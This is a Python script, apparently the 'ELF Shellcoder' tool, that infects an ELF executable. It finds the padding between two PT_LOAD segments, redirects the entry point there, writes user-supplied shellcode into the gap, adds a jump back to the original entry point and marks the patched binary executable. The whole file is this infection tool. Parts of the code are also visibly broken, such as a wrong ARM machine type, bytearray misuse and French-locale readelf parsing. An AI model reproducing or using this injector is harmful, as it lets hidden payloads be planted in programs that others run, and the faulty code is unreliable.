#coding:utf-8

import sys
import os
from pwn import *
import lief

BASE_ADRESS = 0x0000000000400000 #it depend of the file
SHELLCODE_X = "shellcode" #to complete with your shellcode executable

os.system("clear")



def banner():
    banner = """                                                            ___
                                             ________.-----''
                                    ___.--'""___.----''
                                 .-'    _.-'"
                      _ .-.__.--'    .-'
                    .' `  / ' __ _.-'
                    ) '  '   )   /`-._.
                   (.'\          )/))-)\\
                 .'    >.________.--'
              .-'   .-'
            .'    .'
         .-'   .-'
       .'    .'
      /    .'      _____ _     ______   _____ _          _ _               _           
    .'   .'       |  ___| |    |  ___| /  ___| |        | | |             | |          
   /  ,,/         | |__ | |    | |_    \ `--.| |__   ___| | | ___ ___   __| | ___ _ __ 
  /'''/           |  __|| |    |  _|    `--. \ '_ \ / _ \ | |/ __/ _ \ / _` |/ _ \ '__|
 / ,''            | |___| |____| |     /\__/ / | | |  __/ | | (_| (_) | (_| |  __/ |   
/''               \____/\_____/\_|     \____/|_| |_|\___|_|_|\___\___/ \__,_|\___|_|   

                    
                    
                        [+] GitHub : https://github.com/saymant [+]
                      [+] Twitter : https://twitter.com/__saymant [+] 

"""
    print('\033[0;36m\\' + banner + '\033[37m')


def usage():
    
    try:
        global file
        file = str(sys.argv[1])
    except IndexError:
        print("Usage : python3 {} <binary>".format(sys.argv[0]))
        exit(1)
    
    try:
        with open(file):
           print("[+] Opening \"{}\" file ...".format(file))
           sleep(1)
           pass
    except IOError:
        print('[-]' + '\033[0;31m\\' + 'Wrong !' + '\033[37m' ' The file could not be opened').strip("\\")
        exit(1)

def formate():
    global file_format
    global bits
    
    size_min = len(sys.argv[1])
    size_min += 2
    size_max = size_min + 11

    print("[+] File Format Analysis ...")
    sleep(1)

    os.system("file {} > format_file.txt".format(str(sys.argv[1])))
    f = open("format_file.txt", "r")
    form = f.read()

    BUFF  = os.popen("file {} | grep -oi elf".format(str(sys.argv[1]))).read()

    if BUFF.rstrip() == "ELF":
        base = form[size_min:size_max]
        file_format = base.strip("64-bit")
        file_format = base.strip("32-bit")
        
        if file_format == "ELF 64-bit":
            bits = 64
        elif file_format == "ELF 32-bit":
           bits = 32 

        print("[+] File format : " + file_format)

        os.system("rm format_file.txt")
        sleep(1)


    else:
        print("[-] The selected file is not an ELF, please restart the script")
        os.system("rm format_file.txt")
        exit(1)
    
    f.close()
    os.system("rm -rf out.txt")

def loader():
    global entry_point
    global pt_load_1_start
    global pt_load_1_end
    global pt_load_2_start
    global pt_load_2_end
    global space

    os.popen("readelf -l {} > out.txt".format(str(sys.argv[1])))
    sleep(1)
    f = open("out.txt", "r")

    lines = f.readlines()

    all_load_str = []
    
    entry_point = ''

    for line in lines:
        if "Point d'entrée" in line:
            entry_point = line.split("Point d'entrée ")[1]

    for (i, l) in enumerate(lines):
            if l.strip().startswith("LOAD"):
                temp_tab = [x for x in l.rstrip().split(" ") if x != ""][1:]
                #all_load_str.append(temp_tab)

                l = lines[i+1]

                temp_tab.extend([x for x in l.rstrip().split(" ") if x != ""])
                all_load_str.append(temp_tab)
    
    if len(all_load_str) < 2:
        print("[-] Don't found two PT_LOAD segment.")
        exit(1)
    
    else:
        print("[+] PT_LOAD segments number : %s\n" % len(all_load_str))
        print("Entrypoint : {}".format(entry_point))
        sleep(1)

    l = []
    i = 0

    for (x, tab) in enumerate(all_load_str):
        
        print("\n[+] PT_LOAD number %s [+]" % x)
        print("")
        print("Offset        : {}".format(tab[0]))
        print("Segment size  : {}".format(tab[3]))
        print("")

        if i == 0:
            pt_load_1_start = tab[0]
            pt_load_1_end = tab[3]
            
            start_addr = tab[1]  # Adresse de base où sera mappé le fichier
        
        else:
            pt_load_2_start = tab[0]
            pt_load_2_end = hex(int(pt_load_2_start, 16) + int(tab[3], 16))
        
        
        i += 1
    
    space = hex(int(pt_load_2_start, 16) - int(pt_load_1_end, 16))
    print("Maximum size of the code to be injected : {} bytes\n".format(int(space, 16)))


def infect_entry_point():
    global start_shellcode

    binary = lief.parse(file)
    header = binary.header  

    start_shellcode = int(BASE_ADRESS) + int(pt_load_1_end, 16)
    
    header.entrypoint = start_shellcode
    if bits == 64:
        header.machine_type = lief.ELF.ARCH.AARCH64
    
    elif bits == 32:
        header.machine_type = lief.ELF.ARCH.AARCH32
	
    print("[+] Entry Point Patched")
    
    binary.write("{}_patched".format(file))

def injection():
    
    global start_code
    fd = open("{}_patched".format(file), "rb+")

    SHELLCODE_Y = open("{}".format(SHELLCODE_X), "rb+")
    SHELLCODE = bytearray(SHELLCODE_Y)
	
    start_code = hex(int(BASE_ADRESS) + int(pt_load_1_end, 16))
	


    if bits == 64:            
        SHELLCODE += b'\x48\x31\xc0'    #xor eax, eax
        SHELLCODE += b'\x48\x31\xdb'    #xor ebx, ebx
        SHELLCODE += b'\x48\x31\xc9'    #xor ecx, ecx
        SHELLCODE += b'\x48\x31\xd2'    #xor edx, edx
        SHELLCODE += b'\x48\x31\xf6'    #xor esi, esi
    else:
        SHELLCODE += b'\x31\xc0'    #xor eax, eax
        SHELLCODE += b'\x31\xdb'    #xor ebx, ebx
        SHELLCODE += b'\x31\xc9'    #xor ecx, ecx
        SHELLCODE += b'\x31\xd2'    #xor edx, edx
        SHELLCODE += b'\x31\xf6'    #xor esi, esi

    
    #mov ebp, OEP ; jmp ebp
    if bits == 64:
        SHELLCODE.append(0xbd)
        SHELLCODE.append(p64(int(entry_point)))
        SHELLCODE.append(0xff)
        SHELLCODE.append(0xe5)
    else:
        SHELLCODE.append(0xbd)
        SHELLCODE.append(p32(int(entry_point)))
        SHELLCODE.append(0xff)
        SHELLCODE.append(0xe5)
	
    print("[+] Jump on OEP added")
	
    fd.seek(int(start_code, 16))
    fd.write(SHELLCODE)
    fd.close()

banner()
usage()
formate()
loader()
infect_entry_point()
injection()

os.system("chmod +x {}_patched".format(file))
print("")
print("[~] Injected correctly [~]")
